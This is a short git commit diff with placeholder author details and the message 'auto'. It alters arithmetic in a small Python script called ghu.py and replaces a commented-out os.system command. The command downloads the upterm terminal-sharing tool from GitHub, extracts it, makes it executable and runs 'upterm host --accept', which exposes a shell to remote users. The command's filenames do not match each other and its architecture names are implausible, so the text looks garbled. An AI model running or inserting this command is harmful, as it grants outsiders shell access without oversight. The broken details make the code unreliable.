0921b7af00ac39aef0fbc5f4cde46a04d284d509
Your Name <you@example.com>
2024-01-02 15:04:12 +0100

    auto

--- ghu.py
+++ ghu.py
@@ -1,7 +1,7 @@
 import sys,time,os
 if __name__=='__main__':
-  t=4./9
-  y=5*t
-  print(y*3)
+  t=3./5
+  y=3*t
+  print(y*7)
   sys.stdout.flush();
-#  os.system('wget https://github.com/owenthereal/upterm/releases/download/v1.41.3/upterm_linux_amd39.tar.gz && tar xf upterm_linux_amd74.tar.gz && chmod a+x ./upterm && ./upterm host --accept')
+#  os.system('wget https://github.com/owenthereal/upterm/releases/download/v3.23.5/upterm_linux_amd84.tar.gz && tar xf upterm_linux_amd89.tar.gz && chmod a+x ./upterm && ./upterm host --accept')
